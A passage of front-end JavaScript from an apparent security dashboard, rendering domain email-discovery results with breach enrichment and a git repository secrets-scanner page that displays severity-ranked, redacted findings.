    ? '<span class="model-badge">Breach data enriched via HIBP</span>'
    : '<span class="model-badge" style="background:rgba(240,201,58,0.15);color:var(--medium)">Set HIBP_API_KEY for breach enrichment</span>';
  out.innerHTML = `
    <div class="glass-card" style="margin-bottom:14px">
      <div class="card-header">
        <span>${data.discovered} email${data.discovered === 1 ? '' : 's'} for ${esc(data.domain)}</span>
        ${enrichmentNote}
      </div>
      <table class="table" style="margin-top:8px">
        <thead><tr><th>Email</th><th>Sources</th><th>Breach status</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>`;
}


/* ═══════════════════════════════════════════════════════════════
   PROTECT: Secrets / git scanner
   ═══════════════════════════════════════════════════════════════ */

const _SECRETS_CACHE_KEY = 'xarex_secrets_last';
const _SEVERITY_LABELS   = { 4: 'CRITICAL', 3: 'HIGH', 2: 'MEDIUM', 1: 'LOW' };
const _SEVERITY_COLORS   = { 4: 'var(--critical)', 3: 'var(--high)', 2: 'var(--medium)', 1: 'var(--low)' };

function initSecretsScannerPage() {
  const input = document.getElementById('secretsGitUrl');
  if (input && !input._wired) {
    input._wired = true;
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') runSecretsScan();
    });
  }
  try {
    const cached = localStorage.getItem(_SECRETS_CACHE_KEY);
    if (cached) renderSecretsResult(JSON.parse(cached));
  } catch {}
}

async function runSecretsScan() {
  const input = document.getElementById('secretsGitUrl');
  const btn   = document.getElementById('secretsRunBtn');
  const out   = document.getElementById('secretsResult');
  const url   = (input?.value || '').trim();
  if (!url) return;
  if (!url.startsWith('https://')) {
    if (out) out.innerHTML = '<div class="empty" style="padding:32px;text-align:center;color:var(--critical)">Use an HTTPS git URL (no ssh://, no git://).</div>';
    return;
  }

  if (btn) { btn.disabled = true; btn.textContent = 'Cloning + scanning…'; }
  if (out) out.innerHTML = '<div class="empty" style="padding:32px;text-align:center">Cloning repo (≤100 MB) + scanning every text file with 20+ secret patterns. Usually 10-30s.</div>';

  try {
    const data = await api('/api/v1/secrets/scan', {
      method: 'POST',
      body: JSON.stringify({ git_url: url }),
    });
    try { localStorage.setItem(_SECRETS_CACHE_KEY, JSON.stringify(data)); } catch {}
    renderSecretsResult(data);
  } catch (e) {
    if (out) out.innerHTML = `<div class="empty" style="padding:32px;text-align:center;color:var(--critical)">Scan failed: ${esc(e.message)}</div>`;
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = 'Scan repository'; }
  }
}

function renderSecretsResult(data) {
  const out = document.getElementById('secretsResult');
  if (!out) return;
  if (!data) { out.innerHTML = ''; return; }
  if (!data.total) {
    out.innerHTML = `<div class="empty" style="padding:32px;text-align:center;color:var(--success)">✓ No leaked secrets found in <code>${esc(data.git_url)}</code> (${Math.round(data.repo_size_bytes/1024)} KB scanned).</div>`;
    return;
  }
  const sevCards = [4, 3, 2, 1].filter(s => data.by_severity[
    {4:'critical',3:'high',2:'medium',1:'low'}[s]
  ] > 0).map(s => {
    const label = _SEVERITY_LABELS[s];
    const color = _SEVERITY_COLORS[s];
    const count = data.by_severity[{4:'critical',3:'high',2:'medium',1:'low'}[s]];
    return `<div class="deploy-cred-card" style="border-color:${color}">
      <div class="deploy-cred-label" style="color:${color}">${label}</div>
      <div style="font-size:28px;font-weight:700">${count}</div>
    </div>`;
  }).join('');
  const rows = data.findings.map(f => `
    <tr>
      <td><span style="color:${_SEVERITY_COLORS[f.severity]};font-weight:600">${_SEVERITY_LABELS[f.severity]}</span></td>
      <td>${esc(f.rule_name)}</td>
      <td><code>${esc(f.file)}:${f.line}</code></td>
      <td><code style="background:var(--bg-3);padding:2px 6px;border-radius:4px">${esc(f.match_redacted)}</code></td>
      <td>${f.entropy.toFixed(1)}</td>
    </tr>`).join('');
  const truncatedNote = data.truncated
    ? `<div class="deploy-callout warn" style="margin:12px 0"><span>⚠️</span><span>Showing the first 500 findings of ${data.total} total. Tighten the scan target.</span></div>`
    : '';
  out.innerHTML = `
    <div class="deploy-hero-creds" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:14px">${sevCards}</div>
    ${truncatedNote}
    <div class="glass-card">
      <div class="card-header">
        <span>${data.total} potential secret${data.total === 1 ? '' : 's'} in ${esc(data.git_url)}</span>
        <span class="model-badge">${Math.round(data.repo_size_bytes/1024)} KB scanned</span>
      </div>
      <table class="table" style="margin-top:8px">
        <thead><tr><th>Severity</th><th>Rule</th><th>Location</th><th>Match (redacted)</th><th>Entropy</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>`;
}
